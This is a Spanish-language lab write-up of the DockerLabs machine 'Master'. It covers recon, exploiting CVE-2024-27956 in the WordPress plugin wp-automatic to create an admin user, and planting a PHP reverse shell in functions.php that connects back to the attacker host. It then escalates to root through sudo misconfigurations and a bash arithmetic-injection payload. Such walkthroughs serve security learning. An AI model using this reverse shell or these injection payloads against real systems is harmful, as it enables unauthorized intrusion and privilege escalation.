@@ -1,0 +1,228 @@
+---
+title: Master
+description: Resolución completa de la máquina virtual *Master* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Master**, desarrollada por *Pylon & El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con WordPress que ejecuta el plugin `wp-automatic` versión 3.92.0, vulnerable a **CVE-2024-27956**. Esta vulnerabilidad permite la creación de un usuario administrador sin autenticación, facilitando el acceso al panel de WordPress. Desde allí, se sube una reverse shell para obtener acceso como `www-data`.
+Una vez dentro, se encadenan múltiples configuraciones inseguras de `sudo`: `www-data` puede ejecutar `php` como `pylon`, `pylon` puede ejecutar un script vulnerable a inyección como `mario`, y `mario` puede ejecutar otro script similar como root, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Master',
+    Autor: 'Pylon & El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '12/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Master.zip
+sudo bash auto_deploy.sh Master.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Master/{content,exploits,nmap,scripts}
+cd Master
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769404894/Ports_ek3ndv.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+Se identifica que el sitio utiliza WordPress y el plugin `wp-automatic` versión 3.92.0:
+
+![Info](https://res.cloudinary.com/dewqswzke/image/upload/v1769404895/Info_vb7czt.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Explotación de CVE-2024-27956
+
+La versión 3.92.0 del plugin `wp-automatic` es vulnerable a **CVE-2024-27956**, permitiendo la creación de un usuario administrador sin autenticación.
+
+Se utiliza el exploit disponible:
+
+```bash
+python3 exploit.py http://172.17.0.2/
+```
+
+Credenciales creadas: `eviladmin:admin`
+
+### 2.2 Acceso al panel de WordPress
+
+Se accede al panel `/wp-admin`:
+
+![Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1769404895/AdminDashboard_qb12fb.png)
+
+### 2.3 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se edita `functions.php` del tema activo y se inyecta:
+
+```php
+$sock=fsockopen("172.17.0.1",443);
+$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1769404895/ReverseShell_eqkqf2.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → pylon
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1769404896/Sudo-lWwwData_dzeeua.png)
+
+Se puede ejecutar `php` como `pylon`:
+
+```bash
+sudo -u pylon php -r "system('/bin/bash');"
+```
+
+![Pylon](https://res.cloudinary.com/dewqswzke/image/upload/v1769404894/Pylon_igxsgq.png)
+
+### 3.2 De pylon → mario
+
+Se verifican los permisos sudo de `pylon`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l pylon](https://res.cloudinary.com/dewqswzke/image/upload/v1769404896/Sudo-lPylon_fslnbg.png)
+
+Se ejecuta el script `pingusorpresita.sh` como `mario`, vulnerable a inyección de comandos:
+
+```bash
+sudo -u mario bash /home/mario/pingusorpresita.sh
+test[$(/bin/bash >&2)]+1
+```
+
+![Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1769404895/Mario_suijsx.png)
+
+### 3.3 De mario → root
+
+Se verifican los permisos sudo de `mario`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1769404896/Sudo-lMario_oipzmj.png)
+
+Se ejecuta `pylonsorpresita.sh` como root:
+
+```bash
+sudo bash /home/pylon/pylonsorpresita.sh
+test[$(/bin/bash >&2)]+1
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769404895/Root_ovmz4b.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Plugin wp-automatic vulnerable a CVE-2024-27956",
+      severity: "Crítica",
+      impact: "Creación de usuario administrador y RCE"
+    },
+    {
+      vulnerability: "Divulgación de versiones de plugins",
+      severity: "Media",
+      impact: "Facilita explotación dirigida"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en php",
+      severity: "Alta",
+      impact: "Escalada a pylon"
+    },
+    {
+      vulnerability: "Scripts bash sin validación de entrada",
+      severity: "Alta",
+      impact: "Inyección de comandos y escalada a root"
+    }
+  ]}
+/>
